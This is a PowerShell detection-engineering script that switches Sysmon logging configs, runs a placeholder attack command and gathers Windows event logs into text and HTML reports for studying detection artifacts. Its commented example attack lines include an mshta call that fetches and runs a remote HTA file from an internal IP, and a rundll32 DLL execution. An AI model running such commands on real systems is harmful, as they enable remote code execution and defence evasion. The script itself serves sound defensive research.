# Automate Everything
# -----------------------------
# Sysmon Config and Logging Script 

<#
-----
Mattifestation Method:

1. Understand the Implementation
2. Develop Attack Validations
	- Develop as many attack variants as possible.
		1. Identify common and/or distinct detection data sources across procedures
		2. Maximize "detection coverage"
3. Observe Detection Artifacts
	- Using procmon

#>

# CONSTANTS:
# ==================
$newest_log_writes_period = (New-TimeSpan -Minute 10) # Get the logs that were most recently updated (Get-Newest-Log-Writes)
$pull_by_id_period = (New-TimeSpan -Hour 24)		  # Get the events by id (Pull-By-ID)
$pull_by_string_period = (New-TimeSpan -Hour 12)	  # Get events containing an particular string (Search-For-String-In-Source)
$pull_all_period = (New-TimeSpan -Hour 1)			  # Get all events in a particular time period (Pull-Event-Logs)

# Sysmon:
$sysmon_path = "C:\Sysinternals\SysinternalsSuite\Sysmon64.exe"		# Path to Sysmon exe
$sysmon_on_config_location = "$PWD\on_config.xml"					# Path to "log everything" config
$sysmon_off_config_location = "$PWD\off_config.xml"					# Path to "log nothing" config

# =====================

<#
Function: Pull-Logs

Pull events from all logs between start and end time
#>
function Pull-Logs($start_time, $end_time) {
	Write-Host "Pulling Logs..."

	# Get Events for all Event Logs:
	$Events = Get-WinEvent -ListLog *  -ErrorAction Ignore | Where-Object { $_.LastWriteTime -ge $start_time } | ForEach-Object {
		Get-WinEvent -FilterHashTable @{LogName=$_.LogName; StartTime=$start_time} -ErrorAction Ignore | Where-Object {$_.TimeCreated -le $end_time}
	} | Sort-Object -Property TimeCreated
	
	$DateFile = Get-Date -format "yyyy-MM-ddTHH-mm-ss-ff"  
	# Print Results to Console:
	
	
	$Content =  $Events | ForEach-Object {
		$obj_title = "$($_.TimeCreated) <b>$($_.Id)</b> - $($_.ProviderName), $($_.TaskDisplayName)"
		$obj = $_ | Format-List | Out-String
		"<li><button onClick=""toggleElem(this)"">Toggle</button><div class=""item""><div class=""item-head"">$obj_title</div><pre>$obj</pre></div></li>"
	}
	
	"<html><head></head><style>ul{list-style-type:none;}.item{border: 1px solid black;margin:3px;}.item-head{background-color: #111828;color:#cecece;padding:3px;}pre{white-space: pre-wrap;padding:3px;}button{margin:3px;}</style><body><button onclick=""exportElems()"">Export</button><a id=""export-link"" style=""display:none""></a><ul id=""events"">$Content</ul><script>function toggleElem(e){var li=e.nextSibling;li.style.display=li.style.display==""none""?""block"":""none"";}function exportElems(){var blob = """"; var ul = document.getElementById(""events""); var items = ul.getElementsByTagName(""li""); for (var i = 0; i < items.length; ++i) {var event_div = items[i].lastChild;if(event_div.style.display != ""none""){blob += event_div.lastChild.innerHTML + ""\n"";}} var link = document.getElementById(""export-link""); link.href = 'data:text/plain;charset=UTF-8,' + encodeURIComponent(blob); link.innerHTML = 'Download'; link.download = 'export.txt'; link.style.display = ""block"";}</script></body></html>" | Out-File -FilePath "$DateFile.html"
	
	$Events | Format-List
	
	# Write Results to File:	
	$Events | Format-List | Out-File -FilePath "$DateFile.txt"
	
	
	Write-Host " "
	Write-Host "Wrote Results to File '$DateFile.txt' and '$DateFile.html' " -ForegroundColor "Green"

}

# -----------------------------------------------------------------------
# This is probably the most convienient method.
# The attack command needs to be replaced!!!
# -----------------------------------------------------------------------
<#
Function: Matt-Method
Get all events created across all logs during the running of an exploit or script.
#>
function Matt-Method {
	Do 
	{
		$toggle_sysmon = Read-Host -Prompt "Toggle Sysmon configs [y/n]: "
	} While (($toggle_sysmon -ne "y") -and ($toggle_sysmon -ne "n"))
	
	# Set Sysmon Config to the log everything config:
	if ($toggle_sysmon -eq "y") {
		Enable-Sysmon-Config
	}
	
	Start-Sleep -Seconds 3
	
	$start_time = Get-Date
	
	# Perform Attack Here:
	# ---------------------------------------------------------------------
	# & <- call operator, force powershell to treat as a cmd to be executed. Use cmd.exe /c <cmd> to spawn a new terminal that will stay open until closed.
	# USE FORMAT: 
	# &cmd.exe /c <cmd>
	
	# Examples (REPLACE ME):
	& cmd.exe /c notepad.exe
	# & cmd.exe /c mshta.exe http://192.168.38.107:8000/api/api_token.hta
	# & cmd.exe /c rundll32.exe urlmon1.dll,DllRegisterServer
	
	# Catch behaviors in new threads, and processes spawned by the original process:
	Start-Sleep -Seconds 5
	# ----------------------------------------------------------------------
	
	# End Attack Here
	$end_time = Get-Date
	
	Start-Sleep -Seconds 5
	
	Pull-Logs $start_time $end_time
	
	if ($toggle_sysmon -eq "y") {
		# Revert to the Log Nothing Config.
		Disable-Sysmon-Config
	}
	
	Start-Sleep -Seconds 3
}

<#
Function: Search-For-String-In-Source

Search for a particular string in logs:
Use the * syntax

Note: This is slow.
#>
function Search-For-String-In-Source {
	$stime = (Get-Date) - $pull_by_string_period
	$log_name = Read-Host -Prompt "Enter Logname (Default Sysmon)"
	if (! $log_name) {
		$log_name = "Microsoft-Windows-Sysmon/Operational"
	}
	
	$query =  Read-Host -Prompt "Enter a string"
	if ($query) {
		$Events = Get-WinEvent -LogName $log_name  -ErrorAction Ignore | Where-Object { $_.TimeCreated -ge $stime}
		$Events | ForEach-Object {
		   $s = "$($_.Message)"
		   if ($s -like $query){
		   	$_ | Format-List
		   }
		}
	}
}

<#
Function: Pull-By-ID

Pull Events by ID
#>
function Pull-By-ID {
	$stime = (get-date) - $pull_by_id_period
	$log_name = Read-Host -Prompt "Enter Logname (Default Sysmon)"
	if (! $log_name) {
		$log_name = "Microsoft-Windows-Sysmon/Operational"
	}
	
	$event_id = Read-Host -Prompt "Enter Event ID (Default None)"
	if ($event_id) {
		Get-WinEvent -filterhash @{Logname= $log_name;ID=$event_id} -ErrorAction Ignore | Where-Object { $_.TimeCreated -ge $stime } | Format-List
	} else {
		Get-WinEvent -filterhash @{Logname= $log_name} -ErrorAction Ignore | Where-Object { $_.TimeCreated -ge $stime } | Format-List
	}
}

<#
Function: Get-Newest-Log-Writes 

Get Event Logs updated in the last 10 minutes
#>
function Get-Newest-Log-Writes {
	$stime = (Get-Date) - $newest_log_writes_period
	Get-WinEvent -ListLog * -ErrorAction Ignore | Where-Object { $_.LastWriteTime -ge $stime}
}

<#
Function: Pull-Logs

Get Events from Sysmon and System logs in the past 10 minutes:
#>
function Pull-Event-Logs {
	$start_time = (get-date) - $pull_all_period
	$end_time = (get-date)
	
	Pull-Logs $start_time $end_time
}

<#
Function: Enable-Sysmon-Config

Set Sysmon config to the "log everything" config
#>
function Enable-Sysmon-Config {
	#$sysmon_path = "C:\Sysinternals\SysinternalsSuite\Sysmon64.exe"
	& cmd /c "$sysmon_path -c $sysmon_on_config_location 2>&1"
	Write-Host ""
	Write-Host "Sysmon Config Updated!" -ForegroundColor "Green"
	
}

<#
Function: Disable-Sysmon-Config

Set Sysmon config to "log nothing" config
#>
function Disable-Sysmon-Config {
	#$sysmon_path = "C:\Sysinternals\SysinternalsSuite\Sysmon64.exe"
	& cmd /c "$sysmon_path -c $sysmon_off_config_location 2>&1"
	Write-Host ""
	Write-Host "Sysmon Config Updated!" -ForegroundColor "Green"
}

function Show-Menu {
	Write-Host ""
	Write-Host "+---------------------------+" -ForegroundColor "Cyan"
	Write-Host "| >> LOG EXPLORER           |" -ForegroundColor "Cyan"
	Write-Host "+---------------------------+" -ForegroundColor "Cyan"
	Write-Host "1 - Collect Logs (Range: 10m)"
	Write-Host "2 - Use ""Log Everything"" Sysmon Config"
	Write-Host "3 - Use ""Log Nothing"" Sysmon Config"
	Write-Host "q - quit"
	Write-Host " "
	Write-Host "--- [EVENTS]" -ForegroundColor "Cyan"
	Write-Host "a - Get most recently updated logs (Range: 10m)"
	Write-Host "b - Find Events by ID (Range: 1d)"
	Write-Host "c - Find Events containing a particular string (Range: 12h)"
	Write-Host "d - Mattifestation Method (Update Attack Command First)" -ForegroundColor "Yellow"
}

do
{
Show-Menu
Write-Host ">>>" -ForegroundColor "Green" -NoNewLine
$selection = Read-Host -Prompt " "
switch ($selection)
{
	'1'{
		Pull-Event-Logs
	} '2' {
		Enable-Sysmon-Config
	} '3' {
		Disable-Sysmon-Config
	} 'a' {
		Get-Newest-Log-Writes
	} 'b' {
		Pull-By-ID
	} 'c' {
		Search-For-String-In-Source
	} 'd' {
		Matt-Method
	}
  }
	pause
} until ($selection -eq 'q')
